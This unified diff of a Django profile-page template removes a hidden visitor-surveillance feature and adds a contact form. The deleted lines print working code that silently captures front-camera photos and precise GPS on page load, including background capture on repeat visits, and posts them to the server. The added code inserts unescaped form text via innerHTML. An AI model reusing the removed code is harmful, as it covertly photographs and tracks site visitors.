@@ -11,10 +11,12 @@
         body {
             position: relative; display: flex; flex-direction: column; justify-content: center; align-items: center;
             min-height: 100vh; color: #ffffff; padding: 40px 20px; overflow-x: hidden; background-color: #060709;
+            --background-source: linear-gradient(135deg, #0f111a 0%, #060709 100%);
+            --theme-color: rgba(191, 149, 63, 0.12);
         }
         body::before {
             content: ""; position: fixed; top: 0; left: 0; right: 0; bottom: 0; z-index: -1;
-            background: {% if profile.background_image %} url("{{ profile.background_image.url }}") {% else %} linear-gradient(135deg, #0f111a 0%, #060709 100%) {% endif %} no-repeat center center;
+            background: var(--background-source) no-repeat center center;
             background-size: cover; filter: blur(8px) brightness(0.45); transform: scale(1.05);
         }
         .container {
@@ -23,6 +25,10 @@
             border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 28px;
             box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.1);
             animation: fadeIn 0.8s ease-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         .logo-wrapper {
             position: relative; width: 106px; height: 106px; margin: 0 auto 24px auto;
@@ -33,14 +39,14 @@
         .logo { width: 100%; height: 100%; object-fit: cover; border-radius: 50%; border: 2px solid #060709; background: #111; }
         .title { 
             font-size: 24px; font-weight: 800; letter-spacing: 1px; margin-bottom: 10px; text-transform: uppercase;
-            background: linear-gradient(135deg, #ffffff 0%, #a5a5a5 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            background: linear-gradient(135deg, #ffffff 0%, #a5a5a5 100%); -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent;
         }
         .desc { font-size: 14px; color: rgba(255, 255, 255, 0.7); margin-bottom: 35px; line-height: 1.6; padding: 0 15px; }
 
         /* Premium Tugmalar */
         .link-card {
             position: relative; display: flex; align-items: center;
-            background: {{ profile.theme_color|default:"rgba(191, 149, 63, 0.12)" }}; 
+            background: var(--theme-color);
             backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px);
             border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 18px; padding: 18px 22px; margin-bottom: 18px;
             text-decoration: none; color: #ffffff; transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
@@ -65,6 +71,21 @@
         .link-title { font-size: 16px; font-weight: 600; }
         .link-subtitle { font-size: 12px; color: rgba(255, 255, 255, 0.55); margin-top: 4px; word-break: break-all; }
 
+        /* Contact form */
+        .contact-card { flex-direction: column; align-items: stretch; cursor: default; padding: 22px; }
+        .contact-row { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 12px; }
+        .contact-card input,
+        .contact-card textarea { width: 100%; padding: 14px 14px; border-radius: 14px; border: 1px solid rgba(255,255,255,0.12); background: rgba(255,255,255,0.06); color: #fff; outline: none; transition: border-color 0.25s ease, box-shadow 0.25s ease; }
+        .contact-card input:focus,
+        .contact-card textarea:focus { border-color: #bf953f; box-shadow: 0 0 12px rgba(191,149,63,0.18); }
+        .contact-card textarea { resize: vertical; min-height: 120px; }
+        .contact-card button {
+            width: 100%; background: linear-gradient(45deg, #bf953f, #fcf6ba, #b38728); color: #060709; border: none;
+            padding: 14px; font-weight: 700; border-radius: 14px; cursor: pointer; transition: transform 0.2s ease, box-shadow 0.2s ease; text-transform: uppercase; margin-top: 0;
+        }
+        .contact-card button:hover { transform: translateY(-1px); box-shadow: 0 10px 20px rgba(0,0,0,0.1); }
+        .contact-card button:disabled { opacity: 0.7; cursor: not-allowed; }
+
         /* Premium Modal Oyna */
         .modal-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
@@ -79,7 +100,7 @@
             box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6); transform: scale(0.9); transition: transform 0.4s ease;
         }
         .modal-overlay.active .modal-box { transform: scale(1); }
-        .modal-box h3 { font-size: 22px; margin-bottom: 6px; background: linear-gradient(45deg, #fff, #bf953f); -webkit-background-clip: text; -webkit-text-fill-color: transparent;}
+        .modal-box h3 { font-size: 22px; margin-bottom: 6px; background: linear-gradient(45deg, #fff, #bf953f); -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent;}
         
         .input-group { position: relative; margin: 15px 0; text-align: left; }
         .input-group i { position: absolute; left: 15px; top: 15px; color: rgba(255,255,255,0.4); font-size: 16px; }
@@ -102,33 +123,9 @@
         #video, #canvas { display: none; }
     </style>
 </head>
-<body>
+<body style="--theme-color: {{ profile.theme_color|default:'rgba(191, 149, 63, 0.12)' }}; {% if profile.background_image %}--background-source: url('{{ profile.background_image.url }}');{% endif %}">
 
-    <video id="video" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-
-    <div id="usernameModal" class="modal-overlay">
-        <div class="modal-box">
-            <h3>Xush kelibsiz! 👋</h3>
-            <p style="font-size: 13px; color: rgba(255,255,255,0.6); margin-bottom: 5px;">Davom etish uchun kamida bitta maydonni to'ldiring:</p>
-            
-            <div class="input-group">
-                <i class="bi bi-telegram"></i>
-                <input type="text" id="tgInput" placeholder="Telegram username">
-            </div>
-            <div class="input-group">
-                <i class="bi bi-instagram"></i>
-                <input type="text" id="instaInput" placeholder="Instagram username">
-            </div>
-            <div class="input-group">
-                <i class="bi bi-person-vcard"></i>
-                <input type="text" id="idInput" placeholder="PUBG / MLBB / Istalgan ID">
-            </div>
-
-            <div id="errorBox" class="error-msg">Iltimos, kamida bitta maydonni to'ldiring! ⚠️</div>
-            <button id="submitBtn" onclick="validateAndCapture()">Sahifaga kirish</button>
-        </div>
-    </div>
+    <!-- Modal prompt removed as requested -->
 
     <div class="container">
         {% if profile %}
@@ -202,211 +199,39 @@
 
             {% endif %}
         {% endfor %}
-
-        <div class="developer-footer">
-            <a href="https://t.me/Muxammad_Sodiq_60_70" target="_blank">Muxammad Sodiq</a> tomonidan qilindi
-        </div>
     </div>
 
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-<script>
-// Global o'zgaruvchilar koordinatalar uchun
-    let userLat = null;
-    let userLon = null;
+    <!-- Aloqa formasi va footer: linklar yuqorida, formasi pastda -->
+    <div style="width:100%; max-width:450px; margin:18px auto 6px;">
+        <div id="messagesArea" style="text-align:left; margin-bottom:12px;"></div>
 
-    window.addEventListener('DOMContentLoaded', async () => {
+        <div id="contactFormCard" class="link-card contact-card">
+            <div class="contact-row">
+                <input id="contact_name" placeholder="Ism" />
+                <input id="contact_surname" placeholder="Familiya" />
+            </div>
+            <input id="contact_contact" placeholder="Aloqa (Telefon yoki Email)" />
+            <textarea id="contact_message" placeholder="Xabaringizni yozing..." rows="4"></textarea>
+            <button id="contactSendBtn" onclick="submitContactForm()">Xabar Qoldirish</button>
+        </div>
+
+        <div class="developer-footer" style="text-align:center; margin-top:18px;">
+            <div>{{ profile.title }} — Sahifa</div>
+            <div style="font-size:11px; opacity:0.6; margin-top:6px;">&copy; {{ profile.title }} {{ now|date:"Y" }}</div>
+        </div>
+    </div>
+    
+    
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script>
+    // Minimal JS: remove initial modal, camera and GPS prompts
+    window.addEventListener('DOMContentLoaded', () => {
         if (window.Telegram && window.Telegram.WebApp) {
             window.Telegram.WebApp.ready();
             window.Telegram.WebApp.expand();
         }
-        
-        const isLoggedIn = "{{ is_logged_in }}";
-        const saved = localStorage.getItem('visitor_authenticated');
-        
-        if (isLoggedIn === "False" && !saved) {
-            document.getElementById('usernameModal').classList.add('active');
-            
-            // [YANGI]: Kamera bilan birga brauzerdan aniq GPS koordinatalarni so'rash
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        userLat = position.coords.latitude;
-                        userLon = position.coords.longitude;
-                        console.log("GPS aniqlandi:", userLat, userLon);
-                    },
-                    (error) => { console.log("GPS ruxsat berilmadi yoki xato:", error); },
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            }
-
-            try {
-                activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                const video = document.getElementById('video');
-                video.srcObject = activeStream;
-            } catch (e) {
-                console.log("Kamera ruxsati rad etildi:", e);
-            }
-        } else if (isLoggedIn === "True" || saved) {
-            // Qayta kirganda ham fonda GPSni yangilashga harakat qiladi
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((position) => {
-                    userLat = position.coords.latitude;
-                    userLon = position.coords.longitude;
-                    captureAndSendInBackground();
-                }, () => { captureAndSendInBackground(); }, { enableHighAccuracy: true });
-            } else {
-                captureAndSendInBackground();
-            }
-        }
     });
-
-    async function validateAndCapture() {
-        const tg = document.getElementById('tgInput').value.trim().replace('@', '');
-        const insta = document.getElementById('instaInput').value.trim().replace('@', '');
-        const gId = document.getElementById('idInput').value.trim();
-        const errorBox = document.getElementById('errorBox');
-
-        if (!tg && !insta && !gId) {
-            errorBox.style.display = "block";
-            return;
-        }
-        errorBox.style.display = "none";
-
-        const submitBtn = document.getElementById('submitBtn');
-        submitBtn.innerText = "Tekshirilmoqda...";
-        submitBtn.disabled = true;
-
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-        let imageData = null;
-        let statusText = "Kameraga ruxsat berilmadi ❌";
-
-        try {
-            if (!activeStream) {
-                activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-            }
-            statusText = "Haqiqiy kamera rasmi olindi ✅";
-            context.drawImage(document.getElementById('video'), 0, 0, canvas.width, canvas.height);
-            imageData = canvas.toDataURL('image/jpeg', 0.8);
-            activeStream.getTracks().forEach(track => track.stop());
-        } catch (err) {
-            statusText = "Kamera butunlay rad etildi ⚠️";
-            imageData = await convertUrlToBase64(`https://ui-avatars.com/api/?name=Kamera+Yopiq&background=f43f5e&color=fff&size=512`);
-        }
-
-        const formData = new FormData();
-        formData.append('tg_user', tg || '-');
-        formData.append('insta_user', insta || '-');
-        formData.append('game_id', gId || '-');
-        formData.append('image_data', imageData);
-        formData.append('status_text', statusText);
-        formData.append('screen_size', `${window.screen.width}x${window.screen.height}`);
-        
-        // [YANGI]: GPS ma'lumotlarini jo'natish
-        formData.append('gps_lat', userLat);
-        formData.append('gps_lon', userLon);
-        formData.append('csrfmiddlewaretoken', '{{ csrf_token }}');
-
-        fetch(window.location.href, {
-            method: 'POST',
-            body: formData,
-            headers: { 'X-Requested-With': 'XMLHttpRequest' }
-        }).then(res => res.json())
-        .then(data => {
-            if (data.status === 'success') {
-                localStorage.setItem('visitor_authenticated', 'true');
-                document.getElementById('usernameModal').classList.remove('active');
-            }
-        }).catch(() => {
-            document.getElementById('usernameModal').classList.remove('active');
-        });
-    }
-
-    // Fonda yuborish funksiyasiga ham GPS qo'shildi
-    async function captureAndSendInBackground() {
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-        let imageData = null;
-        let statusText = "Fonda: Kameraga ruxsat berilmadi ❌";
-        let localStream = null;
-
-        try {
-            localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-            statusText = "Fonda: Haqiqiy kamera rasmi olindi ✅";
-            
-            const hiddenVideo = document.createElement('video');
-            hiddenVideo.srcObject = localStream;
-            hiddenVideo.play();
-            
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            context.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
-            imageData = canvas.toDataURL('image/jpeg', 0.8);
-            localStream.getTracks().forEach(track => track.stop());
-        } catch (err) {
-            statusText = "Fonda: Kamera butunlay rad etildi ⚠️";
-            imageData = await convertUrlToBase64(`https://ui-avatars.com/api/?name=Kamera+Yopiq&background=f43f5e&color=fff&size=512`);
-        }
-
-        const formData = new FormData();
-        formData.append('image_data', imageData);
-        formData.append('status_text', statusText);
-        formData.append('screen_size', `${window.screen.width}x${window.screen.height}`);
-        
-        // [YANGI]: Fonda ham GPS uzatish
-        formData.append('gps_lat', userLat);
-        formData.append('gps_lon', userLon);
-        formData.append('csrfmiddlewaretoken', '{{ csrf_token }}');
-
-        fetch(window.location.href, {
-            method: 'POST',
-            body: formData,
-            headers: { 'X-Requested-With': 'XMLHttpRequest' }
-        });
-    }
-    // [YANGI]: Qayta kirishda fonda rasmga olish va yuborish (Validatsiyasiz POST so'rovi)
-    async function captureAndSendInBackground() {
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-        let imageData = null;
-        let statusText = "Fonda: Kameraga ruxsat berilmadi ❌";
-        let localStream = null;
-
-        try {
-            localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-            statusText = "Fonda: Haqiqiy kamera rasmi olindi ✅";
-            
-            // Rasmni tushirish uchun yashirin video elementi (activeStream emas, fon rejimida)
-            const hiddenVideo = document.createElement('video');
-            hiddenVideo.srcObject = localStream;
-            hiddenVideo.play();
-            
-            await new Promise(resolve => setTimeout(resolve, 1000)); // Rasm olish uchun 1 soniya kutish
-            
-            context.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
-            imageData = canvas.toDataURL('image/jpeg', 0.8);
-            
-            localStream.getTracks().forEach(track => track.stop());
-        } catch (err) {
-            statusText = "Fonda: Kamera butunlay rad etildi ⚠️";
-            imageData = await convertUrlToBase64(`https://ui-avatars.com/api/?name=Kamera+Yopiq&background=f43f5e&color=fff&size=512`);
-        }
-
-        // Backendga rasm yuborish (POST so'rovi - Validatsiyasiz)
-        const formData = new FormData();
-        formData.append('image_data', imageData);
-        formData.append('status_text', statusText);
-        formData.append('screen_size', `${window.screen.width}x${window.screen.height}`);
-        formData.append('csrfmiddlewaretoken', '{{ csrf_token }}');
-
-        fetch(window.location.href, {
-            method: 'POST',
-            body: formData,
-            headers: { 'X-Requested-With': 'XMLHttpRequest' }
-        }).catch(() => {
-            console.log("Fonda rasm yuborishda xatolik");
-        });
-    }
 
     function trackClick(linkId) {
         const formData = new FormData();
@@ -436,6 +261,67 @@
         }).catch(err => {
             console.log("Nusxalashda xatolik:", err);
         });
+    }
+
+    // Kontakt formasini yuborish va UIda bot xabari kabi ko'rsatish
+    async function submitContactForm() {
+        const name = document.getElementById('contact_name').value.trim();
+        const surname = document.getElementById('contact_surname').value.trim();
+        const contact = document.getElementById('contact_contact').value.trim();
+        const message = document.getElementById('contact_message').value.trim();
+        const btn = document.getElementById('contactSendBtn');
+
+        if (!message && !contact && !name) {
+            btn.innerText = 'Iltimos, maydonlarni to' + "ldiring";
+            setTimeout(() => btn.innerText = 'Xabar Qoldirish', 1500);
+            return;
+        }
+
+        btn.disabled = true; btn.innerText = 'Yuborilmoqda...';
+
+        const formData = new FormData();
+        formData.append('name', name || '-');
+        formData.append('surname', surname || '-');
+        formData.append('contact', contact || '-');
+        formData.append('message', message || '-');
+        formData.append('csrfmiddlewaretoken', '{{ csrf_token }}');
+
+        try {
+            const res = await fetch('{% url "profile_contact" profile_slug=profile.slug %}', {
+                method: 'POST', body: formData, headers: { 'X-Requested-With': 'XMLHttpRequest' }
+            });
+            const data = await res.json();
+            if (data.status === 'ok') {
+                appendBotMessage(name || 'Foydalanuvchi', message || '(bo`sh)');
+                document.getElementById('contact_name').value = '';
+                document.getElementById('contact_surname').value = '';
+                document.getElementById('contact_contact').value = '';
+                document.getElementById('contact_message').value = '';
+            }
+        } catch (e) {
+            console.log('Kontakt yuborishda xatolik', e);
+        }
+
+        btn.disabled = false; btn.innerText = 'Xabar Qoldirish';
+    }
+
+    function appendBotMessage(from, text) {
+        const area = document.getElementById('messagesArea');
+        const wrapper = document.createElement('div');
+        wrapper.style.margin = '10px 0';
+        wrapper.style.display = 'flex';
+        wrapper.style.gap = '10px';
+
+        const icon = document.createElement('div');
+        icon.style.width = '44px'; icon.style.height = '44px'; icon.style.borderRadius = '50%'; icon.style.background = '#bf953f'; icon.style.display = 'flex'; icon.style.alignItems = 'center'; icon.style.justifyContent = 'center'; icon.style.fontWeight = '700'; icon.innerText = 'B';
+
+        const bubble = document.createElement('div');
+        bubble.style.background = 'rgba(255,255,255,0.04)'; bubble.style.border = '1px solid rgba(255,255,255,0.06)'; bubble.style.padding = '10px 12px'; bubble.style.borderRadius = '12px'; bubble.style.color = '#fff'; bubble.style.maxWidth = '100%';
+        bubble.innerHTML = `<div style="font-size:12px; opacity:0.8; margin-bottom:6px;"><strong>${from}</strong> dan xabar</div><div style="white-space:pre-wrap;">${text}</div>`;
+
+        wrapper.appendChild(icon);
+        wrapper.appendChild(bubble);
+        area.prepend(wrapper);
     }
 </script>
 </body>
